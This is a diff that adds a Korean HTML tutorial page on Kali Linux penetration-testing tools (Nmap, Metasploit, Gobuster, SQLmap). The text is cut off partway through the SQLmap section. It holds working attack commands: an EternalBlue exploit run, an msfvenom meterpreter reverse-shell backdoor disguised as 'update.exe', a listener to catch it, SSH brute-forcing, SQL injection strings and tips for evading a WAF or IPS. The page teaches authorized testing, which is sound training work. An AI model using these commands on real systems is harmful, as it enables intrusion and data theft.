@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>칼리 리눅스 모의해킹 도구 마스터 가이드</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap');
+
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #34495e;
+            --accent-color: #3498db;
+            --danger-color: #e74c3c;
+            --warning-color: #f39c12;
+            --success-color: #27ae60;
+            --bg-color: #f8f9fa;
+            --code-bg: #282c34;
+            --text-main: #333333;
+            --text-muted: #666666;
+        }
+
+        body {
+            font-family: 'Noto Sans KR', sans-serif;
+            line-height: 1.8;
+            color: var(--text-main);
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* 1페이지 분량의 여백 및 가독성 확보를 위한 섹션 스타일 */
+        .section-block {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 50px;
+            margin-bottom: 60px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            page-break-after: always;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: var(--primary-color);
+            border-bottom: 3px solid var(--accent-color);
+            padding-bottom: 15px;
+            margin-bottom: 40px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            color: var(--secondary-color);
+            margin-top: 40px;
+            margin-bottom: 20px;
+            border-left: 5px solid var(--accent-color);
+            padding-left: 15px;
+        }
+
+        h3 {
+            font-size: 1.4em;
+            color: var(--primary-color);
+            margin-top: 30px;
+        }
+
+        p {
+            font-size: 1.1em;
+            margin-bottom: 20px;
+            color: var(--text-main);
+        }
+
+        /* 표 스타일 */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 30px 0;
+            background: #fff;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        th, td {
+            padding: 15px;
+            border: 1px solid #e0e0e0;
+            text-align: left;
+        }
+
+        th {
+            background-color: var(--primary-color);
+            color: #fff;
+            font-weight: 500;
+        }
+
+        tr:nth-child(even) {
+            background-color: #f8f9fa;
+        }
+
+        /* 코드 블록 스타일 */
+        pre {
+            background-color: var(--code-bg);
+            color: #abb2bf;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.95em;
+            line-height: 1.5;
+            margin: 20px 0;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+
+        code.inline {
+            background-color: #e9ecef;
+            color: #d63384;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+        }
+
+        /* 실전 팁 & 자주 하는 실수 박스 */
+        .info-box {
+            border-left: 4px solid;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 0 8px 8px 0;
+            background-color: #fdfdfd;
+        }
+
+        .tip-box {
+            border-color: var(--success-color);
+            background-color: #f0fdf4;
+        }
+
+        .tip-box::before {
+            content: '💡 실전 팁 (Practical Tip)';
+            display: block;
+            font-weight: bold;
+            color: var(--success-color);
+            margin-bottom: 10px;
+        }
+
+        .mistake-box {
+            border-color: var(--danger-color);
+            background-color: #fef2f2;
+        }
+
+        .mistake-box::before {
+            content: '⚠️ 자주 하는 실수 (Common Mistake)';
+            display: block;
+            font-weight: bold;
+            color: var(--danger-color);
+            margin-bottom: 10px;
+        }
+
+        /* 주석/용어 설명 스타일 */
+        .footnote {
+            font-size: 0.9em;
+            color: var(--text-muted);
+            border-top: 1px dashed #ccc;
+            padding-top: 10px;
+            margin-top: 20px;
+        }
+
+        /* 이미지 플레이스홀더 */
+        .image-placeholder {
+            width: 100%;
+            height: 300px;
+            background: linear-gradient(45deg, #f1f2f6, #dfe4ea);
+            border: 2px dashed #ced6e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #747d8c;
+            font-weight: bold;
+            font-size: 1.2em;
+            border-radius: 8px;
+            margin: 40px 0;
+        }
+
+        .highlight {
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Section 1: 도구 분류 및 목록표 -->
+    <div class="section-block">
+        <h1>제 1장. 칼리 리눅스 (Kali Linux) 모의해킹 도구 분류 체계</h1>
+        
+        <p>칼리 리눅스는 정보 보안 전문가와 모의해킹(Penetration Testing, 페너트레이션 테스팅) 컨설턴트를 위해 Offensive Security(오펜시브 시큐리티)사에서 데비안(Debian) 기반으로 제작한 운영체제입니다. 실무에서 수행하는 PT(Penetration Testing, 모의해킹) 방법론의 단계에 맞추어 도구들이 체계적으로 분류되어 있습니다.</p>
+
+        <div class="image-placeholder" style="padding: 0; background: transparent; border: none; height: auto; margin: 40px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.15); border-radius: 12px; overflow: hidden;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 400" width="100%" height="400" preserveAspectRatio="xMidYMid slice" style="display: block;">
+                <defs>
+                    <linearGradient id="bgCity" x1="0%" y1="0%" x2="0%" y2="100%">
+                        <stop offset="0%" stop-color="#0a0a2a"/>
+                        <stop offset="100%" stop-color="#1a1a4a"/>
+                    </linearGradient>
+                    <filter id="glowCity">
+                        <feGaussianBlur stdDeviation="4" result="coloredBlur"/>
+                        <feMerge>
+                            <feMergeNode in="coloredBlur"/>
+                            <feMergeNode in="SourceGraphic"/>
+                        </feMerge>
+                    </filter>
+                </defs>
+                <rect width="100%" height="100%" fill="url(#bgCity)"/>
+                
+                <g stroke="rgba(52, 152, 219, 0.2)" stroke-width="1">
+                    <line x1="0" y1="320" x2="1200" y2="320"/>
+                    <line x1="0" y1="350" x2="1200" y2="350"/>
+                    <line x1="0" y1="390" x2="1200" y2="390"/>
+                    <line x1="200" y1="300" x2="0" y2="400"/>
+                    <line x1="400" y1="300" x2="300" y2="400"/>
+                    <line x1="600" y1="300" x2="600" y2="400"/>
+                    <line x1="800" y1="300" x2="900" y2="400"/>
+                    <line x1="1000" y1="300" x2="1200" y2="400"/>
+                </g>
+
+                <circle cx="600" cy="180" r="100" fill="none" stroke="#e74c3c" stroke-width="2" filter="url(#glowCity)" opacity="0.6"/>
+                <line x1="480" y1="180" x2="720" y2="180" stroke="#e74c3c" stroke-width="2" opacity="0.4"/>
+                
+                <path d="M50,300 L50,150 L120,150 L120,300 Z" fill="#111827"/>
+                <path d="M150,300 L150,100 L230,100 L230,300 Z" fill="#111827"/>
+                <path d="M260,300 L260,180 L320,180 L320,300 Z" fill="#111827"/>
+                <path d="M850,300 L850,120 L920,120 L920,300 Z" fill="#111827"/>
+                <path d="M960,300 L960,80 L1050,80 L1050,300 Z" fill="#111827"/>
+                <path d="M1080,300 L1080,160 L1150,160 L1150,300 Z" fill="#111827"/>
+
+                <path d="M450,320 L450,150 L520,100 L680,100 L750,150 L750,320 Z" fill="#1e293b" stroke="#3498db" stroke-width="1"/>
+                <path d="M520,100 L520,320" stroke="#3498db" stroke-width="1" opacity="0.5"/>
+                <path d="M680,100 L680,320" stroke="#3498db" stroke-width="1" opacity="0.5"/>
+                
+                <rect x="300" y="160" width="100" height="160" fill="#1e293b" stroke="#2ecc71" stroke-width="1"/>
+                <rect x="800" y="200" width="100" height="120" fill="#1e293b" stroke="#f39c12" stroke-width="1"/>
+
+                <g fill="#00f2fe" filter="url(#glowCity)">
+                    <rect x="540" y="150" width="10" height="30"/>
+                    <rect x="560" y="150" width="10" height="30"/>
+                    <rect x="630" y="150" width="10" height="30"/>
+                    <rect x="650" y="150" width="10" height="30"/>
+                    <rect x="540" y="200" width="10" height="30"/>
+                    <rect x="560" y="200" width="10" height="30"/>
+                    <rect x="630" y="200" width="10" height="30"/>
+                    <rect x="650" y="200" width="10" height="30"/>
+                    <circle cx="600" cy="130" r="15" fill="#e74c3c"/>
+                </g>
+
+                <text x="40" y="50" fill="#00f2fe" font-family="'Noto Sans KR', sans-serif" font-size="28" font-weight="bold" filter="url(#glowCity)">사이버 공간 방어와 공격 (Cyber Defense &amp; Offense)</text>
+                <text x="40" y="80" fill="#ffffff" font-family="'Noto Sans KR', sans-serif" font-size="16" opacity="0.8">모의해킹(Penetration Testing) 대상망 스마트 시티 인프라 시뮬레이션</text>
+                
+                <path d="M350,160 L450,120" stroke="#2ecc71" stroke-width="2" stroke-dasharray="5,5" filter="url(#glowCity)"/>
+                <circle cx="350" cy="160" r="5" fill="#2ecc71" filter="url(#glowCity)"/>
+                
+                <path d="M850,200 L750,120" stroke="#f39c12" stroke-width="2" stroke-dasharray="5,5" filter="url(#glowCity)"/>
+                <circle cx="850" cy="200" r="5" fill="#f39c12" filter="url(#glowCity)"/>
+            </svg>
+        </div>
+
+        <p>아래는 실무 환경에서 가장 빈번하게 사용되는 핵심 카테고리와 대표적인 CLI (Command Line Interface, 명령줄 인터페이스) 도구들의 목록입니다.</p>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>분류 (Category)</th>
+                    <th>대표 도구명</th>
+                    <th>주요 특징 및 역할</th>
+                    <th>CLI 기본 예제 (Basic Command)</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>정보 수집<br>(Information Gathering)</strong></td>
+                    <td>Nmap</td>
+                    <td>네트워크 호스트 탐지, 열린 포트(Port) 및 서비스 버전, OS(운영체제) 식별</td>
+                    <td><code>nmap -sn 192.168.1.0/24</code></td>
+                </tr>
+                <tr>
+                    <td><strong>취약점 분석<br>(Vulnerability Analysis)</strong></td>
+                    <td>Searchsploit</td>
+                    <td>오프라인 Exploit-DB(익스플로잇 데이터베이스) 아카이브 검색 도구</td>
+                    <td><code>searchsploit windows smb</code></td>
+                </tr>
+                <tr>
+                    <td><strong>웹 앱 분석<br>(Web App Analysis)</strong></td>
+                    <td>Gobuster</td>
+                    <td>웹 디렉터리, 파일, DNS 서브도메인 브루트 포싱(무차별 대입) 탐색</td>
+                    <td><code>gobuster dir -u http://example.com -w wordlist.txt</code></td>
+                </tr>
+                <tr>
+                    <td><strong>데이터베이스 평가<br>(Database Assessment)</strong></td>
+                    <td>SQLmap</td>
+                    <td>SQL Injection(SQL 삽입) 취약점 자동 탐지 및 데이터베이스 탈취</td>
+                    <td><code>sqlmap -u "http://example.com/id=1" --dbs</code></td>
+                </tr>
+                <tr>
+                    <td><strong>비밀번호 공격<br>(Password Attacks)</strong></td>
+                    <td>Hydra</td>
+                    <td>다양한 네트워크 프로토콜(SSH, FTP 등) 대상 병렬 로그인 크래킹</td>
+                    <td><code>hydra -l admin -P pass.txt ssh://192.168.1.10</code></td>
+                </tr>
+                <tr>
+                    <td><strong>익스플로잇 도구<br>(Exploitation Tools)</strong></td>
+                    <td>Metasploit</td>
+                    <td>취약점 검증 및 페이로드(Payload) 전송을 위한 통합 프레임워크</td>
+                    <td><code>msfconsole</code></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="footnote">
+            * <strong>CLI (Command Line Interface, 명령줄 인터페이스)</strong>: 마우스 클릭 기반의 그래픽 화면(GUI)이 아닌, 터미널 창에서 텍스트 명령어를 직접 입력하여 컴퓨터와 상호작용하는 환경입니다.<br>
+            * <strong>Exploit (익스플로잇)</strong>: 시스템이나 소프트웨어의 취약점을 이용하여 공격자가 의도한 동작(권한 상승, 원격 명령 실행 등)을 수행하게 만드는 코드나 프로그램입니다.
+        </div>
+    </div>
+
+    <!-- Section 2: Top 1. Nmap -->
+    <div class="section-block">
+        <h1>제 2장. 핵심 모의해킹 도구 실무 가이드 (Top 6)</h1>
+        
+        <h2>1. Nmap (Network Mapper) - 네트워크 자산 및 포트 스캐너</h2>
+        <p>Nmap은 네트워크에 연결된 기기(호스트)를 식별하고, 해당 기기에서 어떤 서비스(포트)가 실행 중인지, 어떤 운영체제(OS)를 사용하는지 탐지하는 사실상의 업계 표준 도구입니다. 정보 수집 단계에서 가장 먼저 실행되는 도구입니다.</p>
+
+        <div class="image-placeholder" style="padding: 0; background: transparent; border: none; height: auto; margin: 40px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.15); border-radius: 12px; overflow: hidden;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 300" width="100%" height="300" style="background: #111827; display: block;">
+                <defs>
+                    <filter id="neonNmap">
+                        <feGaussianBlur stdDeviation="3" result="coloredBlur"/>
+                        <feMerge>
+                            <feMergeNode in="coloredBlur"/>
+                            <feMergeNode in="SourceGraphic"/>
+                        </feMerge>
+                    </filter>
+                </defs>
+                <g stroke="#1e293b" stroke-width="1">
+                    <line x1="0" y1="50" x2="1200" y2="50"/>
+                    <line x1="0" y1="150" x2="1200" y2="150"/>
+                    <line x1="0" y1="250" x2="1200" y2="250"/>
+                    <line x1="200" y1="0" x2="200" y2="300"/>
+                    <line x1="600" y1="0" x2="600" y2="300"/>
+                    <line x1="1000" y1="0" x2="1000" y2="300"/>
+                </g>
+                
+                <rect x="50" y="100" width="300" height="150" fill="#0f172a" stroke="#3498db" stroke-width="2" rx="8"/>
+                <text x="70" y="130" fill="#3498db" font-family="'Noto Sans KR', sans-serif" font-size="16" font-weight="bold">칼리 리눅스 (Kali Linux)</text>
+                <text x="70" y="160" fill="#a0aec0" font-family="monospace" font-size="14">&gt; nmap -sS -p- Target</text>
+                <text x="70" y="185" fill="#2ecc71" font-family="'Noto Sans KR', sans-serif" font-size="14">SYN 패킷(Packet) 전송 중...</text>
+
+                <rect x="850" y="50" width="220" height="250" fill="#1e293b" stroke="#e2e8f0" stroke-width="2" rx="4"/>
+                <text x="870" y="80" fill="#ffffff" font-family="'Noto Sans KR', sans-serif" font-size="16" font-weight="bold">대상 서버 (Target Server)</text>
+                
+                <rect x="880" y="110" width="160" height="30" fill="#0f172a" stroke="#e74c3c" stroke-width="1"/>
+                <text x="890" y="130" fill="#e74c3c" font-family="'Noto Sans KR', sans-serif" font-size="14">포트(Port) 22 (닫힘/Closed)</text>
+
+                <rect x="880" y="160" width="160" height="30" fill="#0f172a" stroke="#2ecc71" stroke-width="2" filter="url(#neonNmap)"/>
+                <text x="890" y="180" fill="#2ecc71" font-family="'Noto Sans KR', sans-serif" font-size="14" font-weight="bold">포트(Port) 80 (열림/Open)</text>
+
+                <rect x="880" y="210" width="160" height="30" fill="#0f172a" stroke="#e74c3c" stroke-width="1"/>
+                <text x="890" y="230" fill="#e74c3c" font-family="'Noto Sans KR', sans-serif" font-size="14">포트(Port) 443 (닫힘/Closed)</text>
+
+                <path d="M360,175 Q600,50 850,175" fill="none" stroke="#3498db" stroke-width="2" stroke-dasharray="10,5">
+                    <animate attributeName="stroke-dashoffset" from="100" to="0" dur="2s" repeatCount="indefinite"/>
+                </path>
+                <polygon points="840,165 855,175 840,185" fill="#3498db"/>
+                <text x="500" y="120" fill="#3498db" font-family="'Noto Sans KR', sans-serif" font-size="14" font-weight="bold">TCP SYN 스캔 (포트 탐지)</text>
+            </svg>
+        </div>
+
+        <h3>실무 실습 명령 예제</h3>
+        
+        <p><strong>예제 1: 대역폭 내 살아있는 호스트 탐지 (Ping Scan)</strong><br>
+        네트워크 대역 내에서 현재 동작 중인 IP 목록만 빠르게 추출할 때 사용합니다. 포트 스캔은 생략합니다.</p>
+<pre><code># 10.10.10.0 부터 10.10.10.255 까지의 C클래스 대역 스캔
+nmap -sn 10.10.10.0/24
+</code></pre>
+
+        <p><strong>예제 2: 서비스 버전 및 특정 포트 정밀 스캔</strong><br>
+        발견된 특정 IP(예: 192.168.50.15)를 대상으로 1번부터 65535번까지 모든 포트를 스캔하고, 실행 중인 서비스의 정확한 버전을 배너 그랩(Banner Grabbing)을 통해 알아냅니다.</p>
+<pre><code># -p- 는 1-65535 전체 포트를 의미하며, -sV는 버전 탐지를 의미함
+nmap -p- -sV 192.168.50.15
+</code></pre>
+
+        <p><strong>예제 3: 공격적인 종합 스캔 (OS 탐지, 스크립트 스캔, 라우팅 추적)</strong><br>
+        대상 서버(nmap 공식 테스트 서버)의 운영체제, 취약점 스크립트 엔진(NSE) 구동 등 포괄적인 정보를 한 번에 수집합니다.</p>
+<pre><code># -A는 공격적(Aggressive) 옵션, -T4는 스캔 속도(빠름)를 의미함
+nmap -A -T4 scanme.nmap.org
+</code></pre>
+
+        <p><strong>예제 4: 방화벽 우회를 위한 은닉 스캔 (Stealth SYN Scan)</strong><br>
+        TCP 3-Way Handshake(연결 수립 과정)를 완전히 맺지 않고 RST 패킷을 보내 연결을 끊음으로써 시스템 로그에 스캔 기록을 덜 남기려는 기법입니다.</p>
+<pre><code># -sS는 SYN 스캔 옵션으로, 실행을 위해 관리자(root) 권한인 sudo가 필요함
+sudo nmap -sS 192.168.50.22
+</code></pre>
+
+        <div class="tip-box">
+            실무에서 고객사 망을 스캔할 때는 <code>-oA</code> 옵션을 추가하여 스캔 결과를 XML, Nmap, Grepable 3가지 포맷으로 반드시 저장해야 합니다. (예: <code>nmap -sV 10.0.0.1 -oA /home/kali/scan_result</code>). 보고서 작성과 나중의 증적으로 활용됩니다.
+        </div>
+
+        <div class="mistake-box">
+            사전 협의(승인)되지 않은 외부 공인 IP나 타 기업의 도메인에 Nmap 스캔을 수행하는 것은 정보통신망법 위반 소지가 있는 불법 행위입니다. 반드시 허가된 자사망이나 모의해킹 동의서가 작성된 타겟에만 실행해야 합니다.
+        </div>
+    </div>
+
+    <!-- Section 3: Top 2. Metasploit -->
+    <div class="section-block">
+        <h2>2. Metasploit Framework (메타스플로잇 프레임워크) - 통합 익스플로잇 도구</h2>
+        <p>발견된 시스템의 취약점을 실제로 공격(Exploitation)하여 제어권을 획득(쉘 획득)하는 데 사용되는 세계에서 가장 널리 쓰이는 오픈소스 해킹 프레임워크입니다. 공격 코드, 페이로드(Payload), 인코더(Encoder)가 모듈화되어 있습니다.</p>
+
+        <div class="image-placeholder" style="padding: 0; background: transparent; border: none; height: auto; margin: 40px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.15); border-radius: 12px; overflow: hidden;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 300" width="100%" height="300" style="background: #0f172a; display: block;">
+                <defs>
+                    <filter id="redGlowMsf">
+                        <feGaussianBlur stdDeviation="3" result="coloredBlur"/>
+                        <feMerge>
+                            <feMergeNode in="coloredBlur"/>
+                            <feMergeNode in="SourceGraphic"/>
+                        </feMerge>
+                    </filter>
+                </defs>
+                <rect x="50" y="80" width="280" height="180" fill="#1e293b" stroke="#e74c3c" stroke-width="2" rx="8"/>
+                <text x="70" y="120" fill="#e74c3c" font-family="'Noto Sans KR', sans-serif" font-size="18" font-weight="bold" filter="url(#redGlowMsf)">공격자 (Attacker)</text>
+                <text x="70" y="150" fill="#a0aec0" font-family="'Noto Sans KR', sans-serif" font-size="14">메타스플로잇(Metasploit)</text>
+                <text x="70" y="180" fill="#2ecc71" font-family="'Noto Sans KR', sans-serif" font-size="14">대기포트(Listen): 4444</text>
+                <text x="70" y="210" fill="#f1c40f" font-family="'Noto Sans KR', sans-serif" font-size="14">미터프리터(Meterpreter) 세션</text>
+
+                <rect x="830" y="80" width="280" height="180" fill="#1e293b" stroke="#94a3b8" stroke-width="2" rx="8"/>
+                <text x="850" y="120" fill="#ffffff" font-family="'Noto Sans KR', sans-serif" font-size="18" font-weight="bold">대상 서버 (Target Server)</text>
+                <text x="850" y="150" fill="#a0aec0" font-family="'Noto Sans KR', sans-serif" font-size="14">취약한 시스템 서비스</text>
+                <rect x="850" y="170" width="240" height="70" fill="#0f172a" stroke="#e74c3c" stroke-dasharray="4,4"/>
+                <text x="860" y="195" fill="#e74c3c" font-family="'Noto Sans KR', sans-serif" font-size="12">악성 페이로드(Payload) 실행</text>
+                <text x="860" y="220" fill="#e74c3c" font-family="'Noto Sans KR', sans-serif" font-size="12">역방향(Reverse) TCP 연결</text>
+
+                <path d="M340,120 L830,120" fill="none" stroke="#e74c3c" stroke-width="3" stroke-dasharray="10,5">
+                    <animate attributeName="stroke-dashoffset" from="50" to="0" dur="1s" repeatCount="indefinite"/>
+                </path>
+                <polygon points="820,110 835,120 820,130" fill="#e74c3c"/>
+                <text x="480" y="105" fill="#e74c3c" font-family="'Noto Sans KR', sans-serif" font-size="14" font-weight="bold" filter="url(#redGlowMsf)">익스플로잇(Exploit) 전송</text>
+
+                <path d="M830,210 L340,210" fill="none" stroke="#2ecc71" stroke-width="3" stroke-dasharray="10,5">
+                    <animate attributeName="stroke-dashoffset" from="0" to="50" dur="1s" repeatCount="indefinite"/>
+                </path>
+                <polygon points="350,200 335,210 350,220" fill="#2ecc71"/>
+                <text x="480" y="240" fill="#2ecc71" font-family="'Noto Sans KR', sans-serif" font-size="14" font-weight="bold">리버스 쉘(Reverse Shell) 연결</text>
+            </svg>
+        </div>
+
+        <h3>실무 실습 명령 예제</h3>
+
+        <p><strong>예제 1: 콘솔 실행 및 특정 취약점 검색</strong><br>
+        MSF 콘솔을 실행하고, 악명 높은 Windows SMB 취약점인 EternalBlue(MS17-010) 공격 모듈을 검색합니다.</p>
+<pre><code># 칼리 터미널에서 프레임워크 실행
+msfconsole
+
+# (msf6 > 프롬프트 상태에서) 취약점 검색
+msf6 > search type:exploit platform:windows smb ms17_010
+</code></pre>
+
+        <p><strong>예제 2: 타겟 설정 및 공격 실행 (Exploit)</strong><br>
+        검색된 공격 모듈을 선택하고, 타겟 서버(RHOSTS) IP를 설정한 뒤 공격을 감행합니다.</p>
+<pre><code># 공격 모듈 선택
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# 타겟 IP 주소 192.168.100.50 셋팅
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.100.50
+
+# 옵션 확인 후 공격 실행
+msf6 exploit(...) > show options
+msf6 exploit(...) > exploit
+</code></pre>
+
+        <p><strong>예제 3: 백도어 생성 (msfvenom 활용)</strong><br>
+        Metasploit 프레임워크의 도구인 `msfvenom`을 사용하여 타겟 PC에서 실행할 악성코드(리버스 쉘 실행 파일)를 직접 생성합니다.</p>
+<pre><code># 공격자(나)의 IP가 10.10.14.5 이고 4444 포트로 연결을 받도록 설정된 Windows용 exe 파일 생성
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > update.exe
+</code></pre>
+
+        <p><strong>예제 4: 핸들러(Listener) 실행하여 연결 대기</strong><br>
+        위에서 생성한 `update.exe`를 타겟이 실행했을 때, 들어오는 연결(Reverse Connection)을 받아주기 위해 리스너를 열어둡니다.</p>
+<pre><code>msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.5
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run
+# 이제 타겟이 파일을 실행하면 세션이 맺어집니다.
+</code></pre>
+
+        <div class="tip-box">
+            <strong>Payload(페이로드)란?</strong> 공격이 성공한 직후 타겟 시스템에서 실행되는 '실제 목적 코드'입니다. 보통 공격자와 통신할 수 있는 Meterpreter(미터프리터 - 강력한 쉘 환경)나 Command Shell(명령 프롬프트)을 열어주는 역할을 합니다.
+        </div>
+
+        <div class="mistake-box">
+            <code>LHOST</code>(Local Host, 공격자 IP)와 <code>RHOSTS</code>(Remote Hosts, 타겟 IP)를 헷갈려 자신을 공격하거나 세션이 맺어지지 않는 실수가 잦습니다. 항상 <code>options</code> 명령어로 IP 설정을 재확인하세요.
+        </div>
+    </div>
+
+    <!-- Section 4: Top 3. Gobuster -->
+    <div class="section-block">
+        <h2>3. Gobuster (고버스터) - 웹 디렉터리 및 서브도메인 탐색기</h2>
+        <p>웹 서버에 숨겨져 있는 디렉터리, 관리자 페이지, 백업 파일, 서브도메인 등을 Wordlist(사전 파일)를 기반으로 무차별 대입(Brute-Force)하여 초고속으로 찾아내는 Go 언어 기반의 CLI 도구입니다.</p>
+
+        <h3>실무 실습 명령 예제</h3>
+
+        <p><strong>예제 1: 기본 웹 디렉터리 탐색 (Directory Enumeration)</strong><br>
+        타겟 웹사이트의 숨겨진 경로(예: /admin, /backup)를 칼리 리눅스에 내장된 사전 파일을 이용해 탐색합니다.</p>
+<pre><code># -u는 타겟 URL, -w는 사전 파일 경로입니다.
+gobuster dir -u http://192.168.50.80 -w /usr/share/wordlists/dirb/common.txt
+</code></pre>
+
+        <p><strong>예제 2: 특정 확장자 파일 집중 탐색</strong><br>
+        디렉터리뿐만 아니라 숨겨진 PHP 소스 코드나 텍스트, 백업 확장자를 가진 특정 파일을 찾습니다.</p>
+<pre><code># -x 옵션으로 php, txt, zip 확장자를 추가하여 탐색합니다.
+gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip
+</code></pre>
+
+        <p><strong>예제 3: DNS 서브도메인 스캐닝 (Subdomain Enumeration)</strong><br>
+        대상 회사의 메인 도메인 외에 개발망, 테스트망 등으로 쓰이는 서브도메인(예: dev.example.com)을 찾습니다.</p>
+<pre><code># dns 모드를 사용하고 -d로 타겟 도메인을 명시합니다.
+gobuster dns -d example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</code></pre>
+
+        <div class="tip-box">
+            웹 스캐닝을 할 때 스레드(Thread) 속도가 너무 빠르면 대상 웹 서버의 방화벽(WAF)이나 IPS(침입방지시스템)에 차단당할 수 있습니다. <code>-t 10</code> 과 같이 스레드 수를 조절하거나 <code>--delay</code> 옵션을 주어 탐지율을 낮추는 전략이 필요합니다.
+        </div>
+    </div>
+
+    <!-- Section 5: Top 4. SQLmap -->
+    <div class="section-block">
+        <h2>4. SQLmap (에스큐엘맵) - 자동화된 데이터베이스 탈취 도구</h2>
+        <p>웹 애플리케이션의 URL 파라미터나 폼 데이터에 존재하는 SQL Injection(SQL 삽입) 취약점을 자동으로 탐지하고, 대상 DB(데이터베이스)의 구조를 파악하여 내부 데이터를 통째로 추출(Dump)해내는 강력한 파이썬 기반 도구입니다.</p>
+
+        <div class="image-placeholder" style="padding: 0; background: transparent; border: none; height: auto; margin: 40px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.15); border-radius: 12px; overflow: hidden;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 300" width="100%" height="300" style="background: #1e1e2f; display: block;">
+                <defs>
+                    <filter id="dataGlowSql">
+                        <feGaussianBlur stdDeviation="3" result="coloredBlur"/>
+                        <feMerge>
+                            <feMergeNode in="coloredBlur"/>
+                            <feMergeNode in="SourceGraphic"/>
+                        </feMerge>
+                    </filter>
+                </defs>
+                <rect x="50" y="100" width="220" height="150" fill="#2d2d44" stroke="#f39c12" stroke-width="2" rx="5"/>
+                <text x="70" y="130" fill="#f39c12" font-family="'Noto Sans KR', sans-serif" font-size="18" font-weight="bold" filter="url(#dataGlowSql)">공격자 (SQLmap)</text>
+                <text x="70" y="160" fill="#a0aec0" font-family="'Noto Sans KR', sans-serif" font-size="14">악성 쿼리(Query) 주입</text>
+                <text x="70" y="190" fill="#2ecc71" font-family="'Noto Sans KR', sans-serif" font-size="14">데이터베이스(DB) 추출 중!</text>
+
+                <rect x="450" y="100" width="220" height="150" fill="#2d2d44" stroke="#94a3b8" stroke-width="2" rx="5"/>
+                <text x="470" y="130" fill="#ffffff" font-family="'Noto Sans KR', sans-serif" font-size="18" font-weight="bold">웹 서버 (Web Server)</text>
+                <text x="470" y="160" fill="#a0aec0" font-family="monospace" font-size="12">http://target.com/?id=1</text>
+                <text x="470" y="190" fill="#e74c3c" font-family="'Noto Sans KR', sans-serif" font-size="12" font-weight="bold">취약점: SQL 삽입(Injection)</text>
+
+                <path d="M850,130 C850,110 950,110 1050,130 L1050,220 C1050,240 950,240 850,220 Z" fill="#2d2d44" stroke="#3498db" stroke-width="2"/>
+                <path d="M850,130 C850,150 950,150 1050,130" fill="none" stroke="#3498db" stroke-width="2"/>
+                <path d="M850,175 C850,195 950,195 1050,175" fill="none" stroke="#3498db" stroke-width="2"/>
+                <text x="890" y="180" fill="#3498db" font-family="'Noto Sans KR', sans-serif" font-size="18" font-weight="bold" filter="url(#dataGlowSql)">데이터베이스 (DB)</text>
+                
+                <path d="M280,130 L450,130" fill="none" stroke="#e74c3c" stroke-width="2" stroke-dasharray="5,5"/>
+                <polygon points="440,125 450,130 440,135" fill="#e74c3c"/>
+                <text x="300" y="120" fill="#e74c3c" font-family="monospace" font-size="12">1' OR '1'='1</text>
+
+                <path d="M680,130 L850,130" fill="none" stroke="#e74c3c" stroke-width="2"/>
+                <polygon points="840,125 850,130 840,135" fill="#e74c3c"/>
+                <text x="690" y="120" fill="#e74c3c" font-family="monospace" font-size="12">SELECT * FROM users</text>
+
+                <path d="M850,200 Q550,280 280,200" fill="none" stroke="#f39c12" stroke-width="4" stroke-dasharray="10,5">
